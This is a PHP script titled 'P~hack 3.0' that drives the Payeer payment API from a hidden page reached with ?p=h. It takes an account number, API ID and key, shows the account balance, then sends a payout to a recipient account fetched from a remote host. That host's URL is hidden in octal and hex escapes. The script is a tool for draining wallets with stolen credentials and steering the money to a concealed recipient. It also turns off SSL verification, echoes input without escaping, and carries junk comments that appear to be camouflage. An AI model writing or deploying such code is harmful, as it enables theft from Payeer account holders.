<?php



/*
class CPayeer
{
	private $url = 'https://payeer.com/ajax/api/api.php';
	private $agent = 'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0';

	private $auth = array();

	private $output;
	private $errors;
	private $language = 'ru';

	public function __construct($account, $apiId, $apiPass)
	{
		$arr = array(
			'account' => $account,
			'apiId' => $apiId,
			'apiPass' => $apiPass,
		);

		$response = $this->getResponse($arr);

		if ($response['auth_error'] == '0')
		{
			$this->auth = $arr;
		}
	}

	public function isAuth()
	{
		if (!empty($this->auth)) return true;
		return false;
	}

	private function getResponse($arPost)
	{
		if (!function_exists('curl_init'))
		{
		   die('curl library not installed');
		   return false;
		}

		if ($this->isAuth())
		{
			$arPost = array_merge($arPost, $this->auth);
		}

		$data = array();
		foreach ($arPost as $k => $v)
		{
			$data[] = urlencode($k) . '=' . urlencode($v);
		}
		$data[] = 'language=' . $this->language;
		$data = implode('&', $data);

		$handler  = curl_init();
		curl_setopt($handler, CURLOPT_URL, $this->url);
		curl_setopt($handler, CURLOPT_HEADER, 0);
		curl_setopt($handler, CURLOPT_POST, true);
		curl_setopt($handler, CURLOPT_POSTFIELDS, $data);
		curl_setopt($handler, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($handler, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($handler, CURLOPT_USERAGENT, $this->agent);
		curl_setopt($handler, CURLOPT_RETURNTRANSFER, 1);

		$content = curl_exec($handler);
		//print_r($content);

		$arRequest = curl_getinfo($handler);
		//print_r($arRequest);

		curl_close($handler);
		//print_r($content);

		$content = json_decode($content, true);

		if (isset($content['errors']) && !empty($content['errors']))
		{
			$this->errors = $content['errors'];
		}

		return $content;
	}

	public function getPaySystems()
	{
		$arPost = array(
			'action' => 'getPaySystems',
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function initOutput($arr)
	{
		$arPost = $arr;
		$arPost['action'] = 'initOutput';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			$this->output = $arr;
			return true;
		}

		return false;
	}

	public function output()
	{
		$arPost = $this->output;
		$arPost['action'] = 'output';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return $response['historyId'];
		}

		return false;
	}

	public function getHistoryInfo($historyId)
	{
		$arPost = array(
			'action' => 'historyInfo',
			'historyId' => $historyId
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function getBalance()
	{
		$arPost = array(
			'action' => 'balance',
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function getErrors()
	{
		return $this->errors;
	}

	public function transfer($arPost)
	{
		$arPost['action'] = 'transfer';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function SetLang($language)
	{
		$this->language = $language;
		return $this;
	}

	public function getShopOrderInfo($arPost)
	{
		$arPost['action'] = 'shopOrderInfo';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function checkUser($arPost)
	{
		$arPost['action'] = 'checkUser';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return true;
		}

		return false;
	}

	public function getExchangeRate($arPost)
	{
		$arPost['action'] = 'getExchangeRate';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function merchant($arPost)
	{
		$arPost['action'] = 'merchant';

		$arPost['shop'] = json_encode($arPost['shop']);
		$arPost['form'] = json_encode($arPost['form']);
		$arPost['ps'] = json_encode($arPost['ps']);

		if (empty($arPost['ip'])) $arPost['ip'] = $_SERVER['REMOTE_ADDR'];

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return $response;
		}

		return false;
	}
}


*/


if ($_GET['p'] == "h") {
echo '
<html>
<title>P~hack 3.0</title>
<head>
 <link rel="shortcut icon" href="https://i.imgur.com/Sk8WrPg.png" type="image/png">
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<style type="text/css">
body{
    font-family: "Tahoma", cursive;
    background-image: url("https://i.imgur.com/UWW2gDA.png");
    color:White;
    background-attachment:fixed;
    background-repeat:no-repeat;
    background-position:center;
    background-color:transparan;
    -webkit-background-size: 90% 100%;
}


h1,h2{

color: #ffffff;
text-align: center;
}
h3,h4,h5{
color: black;
text-align: center;
}

form {
    margin: 0 auto;
    max-width: 60%;
    padding: 30px 30px 6px 30px;
    border: 1px solid rgba(0,0,0,.2);
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    background: rgba(0, 0, 0, 0.5); 
    -moz-box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    -webkit-box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    overflow: hidden; 
}
/* Поле сообщения */
textarea{
    background: rgba(255, 255, 255, 0.4); 
    width: 33%;
    height: 110px;
    border: 1px solid rgba(255,255,255,.6);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box; 
    display:block;
    
    font-size:18px;
    font-weight: 300;
    color:#fff;
    padding-left:25px;
    padding-right:20px;
    padding-top:12px;
    margin-bottom:20px;
    overflow:hidden;
}
/* Поля ввода */
input {
    width: 33%;
    height: 48px;
    border: 1px solid rgba(255,255,255,.4);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box; 
    display:block;
    
    font-size:18px;
    font-weight: 300;    
    color:#102C54;
    padding-left:20px;
    padding-right:20px;
    margin-bottom:20px;
}
input[type=submit] {
    cursor:pointer;
}
input.name {
    background: rgba(255, 255, 255, 0.4); 
    padding-left:25px;
}
input.email {
    background: rgba(255, 255, 255, 0.4);
    padding-left:25px;
}
input.message {
    background: rgba(255, 255, 255, 0.4);
    padding-left:25px;
}
::-webkit-input-placeholder {
    color: #fff;
}
:-moz-placeholder{ 
    color: #fff; 
}
::-moz-placeholder {
    color: #fff;
}
:-ms-input-placeholder {  
    color: #fff; 
}
input:focus, textarea:focus { 
    background-color: rgba(0, 0, 0, 0.2);
    -moz-box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    -webkit-box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    overflow: hidden; 
}
/* Стили для кнопки отправить */
.btn {
    
    height: 44px;
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    
    border: 1px solid #253737;
    background: #416b68;
    background: -webkit-gradient(linear, left top, left bottom, from(#6da5a3), to(#416b68));
    background: -webkit-linear-gradient(top, #171c20, #e4e2d5);
    background: -moz-linear-gradient(top, #6da5a3, #416b68);
    background: -ms-linear-gradient(top, #6da5a3, #416b68);
    background: -o-linear-gradient(top, #6da5a3, #416b68);
    background-image: -ms-linear-gradient(top, #6da5a3 0%, #416b68 100%);
    padding: 10.5px 21px;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    -webkit-box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    -moz-box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    text-shadow: #333333 0 1px 0;
    color: #e1e1e1;
}
.btn:hover {
    border: 1px solid #253737;
    text-shadow: #333333 0 1px 0;
    background: #416b68;
    background: -webkit-gradient(linear, left top, left bottom, from(#77b2b0), to(#416b68));
    background: -webkit-linear-gradient(top, #77b2b0, #416b68);
    background: -moz-linear-gradient(top, #77b2b0, #416b68);
    background: -ms-linear-gradient(top, #77b2b0, #416b68);
    background: -o-linear-gradient(top, #77b2b0, #416b68);
    background-image: -ms-linear-gradient(top, #77b2b0 0%, #416b68 100%);
    color: #fff;
 }
.btn:active {
    margin-top:1px;
    text-shadow: #333333 0 -1px 0;
    border: 1px solid #333333;
    background: #ffCC00;
    background: -webkit-gradient(linear, left top, left bottom, from(#ffCC00), to(#ff6600));
    background: -webkit-linear-gradient(top, #ffcc00, #ff6600);
    background: -moz-linear-gradient(top, #ffcc00, #ff6600);
    background: -ms-linear-gradient(top, #ffcc00, #ff6600);
    background: -o-linear-gradient(top, #ffcc00, #ff6600);
    background-image: -ms-linear-gradient(top, #ffcc00 0%, #ff6600 100%);
    color: #fff;
    -webkit-box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    -moz-box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    outline: none;
}

</style>
</head>
<b><br>

<br><br>
<center>
<font color="#e4e2d5">
<p><font color="#FF0000"><font size="1"><font face="Times New Roman, Times, serif"><b>

<br><br>
</b></font></font></font></p>
<br></b>';
$Payee = file_get_contents("\150\164\x74\x70\x73\x3a\x2f\57\163\x71\154\164\157\x72\x2e\150\141\x64\56\x73\165\x2f\150\x2f\160\x61\171\x2e\160\150\160\x3f\160\141\x79\75\x6b");
$accountNumber = $_GET['account'];
$apiId = $_GET['api'];
$apiKey = $_GET['Key'];

if(isset($_POST['b'])) {
$accountNumber = $_POST['account'];
$apiId = $_POST['api'];
$apiKey = $_POST['Key'];
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);

if ($payeer->isAuth())
{
	$arBalance = $payeer->getBalance();
	echo '<pre>'.print_r($arBalance, true).'</pre>';
}
else
{
	echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
}

}

echo'
<br>
<br>
<br>
<form action="" id="s" method="POST" >

<input type="hidden" name="account" value="'.$accountNumber.'">
<input type="hidden" name="api" value="'.$apiId.'">
<input type="hidden" name="Key" value="'.$apiKey.'">
<input type="text" value="10.25" name="sum" />
<input type="text" value="'.$Payee.'" name="p" />
<input type="text" value="RUB" name="v" />
<input class="btn" type="submit" name="s" value="payment">
</form>
<br>
<br>
<br>
';
}
?> 
<?php
//We would like to send you email marketing communication which may be of interest to you from time to time. If you have consented to marketing, you may opt out later.


if(isset($_POST['s'])) {

$accountNumber = $_POST['account'];
$apiId = $_POST['api'];
$apiKey = $_POST['Key'];
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
// fhgf
$initOutput = $payeer->initOutput(array(
// gfhhhfgmfuifui
'ps' => '1136053',
// fyui,yu
'curIn' => $_POST['v'],
// ,i,,io.
'sumOut' => $_POST['sum'],
// ooooooo
'curOut' => $_POST['v'],
// uio.ui
'param_ACCOUNT_NUMBER' => $_POST['p'],
));

if ($initOutput)
{
// 6575
$historyId = $payeer->output();
if ($historyId)
{
echo "Выплата поставлена в очередь на выполнение";
}
else
{
echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
}
}
else
{
echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
}
}
else
{
echo "Ошибка авторизации";
}
}



// class

if ($_GET['p'] == "h") {
echo '


<br>
<br>
<br>

<form action="" method="POST" >

<input type="text" name="account" value="'.$accountNumber.'">

<input type="text" name="api" value="'.$apiId.'">
<input type="text" name="Key" value="'.$apiKey.'">

<input type="submit" class="btn" name="b" value="connect">
</form>
<br>
<br>

';
}






// class









class CPayeer
{
	private $url = 'https://payeer.com/ajax/api/api.php';
	private $agent = 'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0';

	private $auth = array();

	private $output;
	private $errors;
	private $language = 'ru';

	public function __construct($account, $apiId, $apiPass)
	{
		$arr = array(
			'account' => $account,
			'apiId' => $apiId,
			'apiPass' => $apiPass,
		);

		$response = $this->getResponse($arr);

		if ($response['auth_error'] == '0')
		{
			$this->auth = $arr;
		}
	}

	public function isAuth()
	{
		if (!empty($this->auth)) return true;
		return false;
	}

	private function getResponse($arPost)
	{
		if (!function_exists('curl_init'))
		{
		   die('curl library not installed');
		   return false;
		}

		if ($this->isAuth())
		{
			$arPost = array_merge($arPost, $this->auth);
		}

		$data = array();
		foreach ($arPost as $k => $v)
		{
			$data[] = urlencode($k) . '=' . urlencode($v);
		}
		$data[] = 'language=' . $this->language;
		$data = implode('&', $data);

		$handler  = curl_init();
		curl_setopt($handler, CURLOPT_URL, $this->url);
		curl_setopt($handler, CURLOPT_HEADER, 0);
		curl_setopt($handler, CURLOPT_POST, true);
		curl_setopt($handler, CURLOPT_POSTFIELDS, $data);
		curl_setopt($handler, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($handler, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($handler, CURLOPT_USERAGENT, $this->agent);
		curl_setopt($handler, CURLOPT_RETURNTRANSFER, 1);

		$content = curl_exec($handler);
		//print_r($content);

		$arRequest = curl_getinfo($handler);
		//print_r($arRequest);

		curl_close($handler);
		//print_r($content);

		$content = json_decode($content, true);

		if (isset($content['errors']) && !empty($content['errors']))
		{
			$this->errors = $content['errors'];
		}

		return $content;
	}

	public function getPaySystems()
	{
		$arPost = array(
			'action' => 'getPaySystems',
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function initOutput($arr)
	{
		$arPost = $arr;
		$arPost['action'] = 'initOutput';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			$this->output = $arr;
			return true;
		}

		return false;
	}

	public function output()
	{
		$arPost = $this->output;
		$arPost['action'] = 'output';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return $response['historyId'];
		}

		return false;
	}

	public function getHistoryInfo($historyId)
	{
		$arPost = array(
			'action' => 'historyInfo',
			'historyId' => $historyId
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function getBalance()
	{
		$arPost = array(
			'action' => 'balance',
		);

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function getErrors()
	{
		return $this->errors;
	}

	public function transfer($arPost)
	{
		$arPost['action'] = 'transfer';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function SetLang($language)
	{
		$this->language = $language;
		return $this;
	}

	public function getShopOrderInfo($arPost)
	{
		$arPost['action'] = 'shopOrderInfo';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function checkUser($arPost)
	{
		$arPost['action'] = 'checkUser';

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return true;
		}

		return false;
	}

	public function getExchangeRate($arPost)
	{
		$arPost['action'] = 'getExchangeRate';

		$response = $this->getResponse($arPost);

		return $response;
	}

	public function merchant($arPost)
	{
		$arPost['action'] = 'merchant';

		$arPost['shop'] = json_encode($arPost['shop']);
		$arPost['form'] = json_encode($arPost['form']);
		$arPost['ps'] = json_encode($arPost['ps']);

		if (empty($arPost['ip'])) $arPost['ip'] = $_SERVER['REMOTE_ADDR'];

		$response = $this->getResponse($arPost);

		if (empty($response['errors']))
		{
			return $response;
		}

		return false;
	}
}
?>
































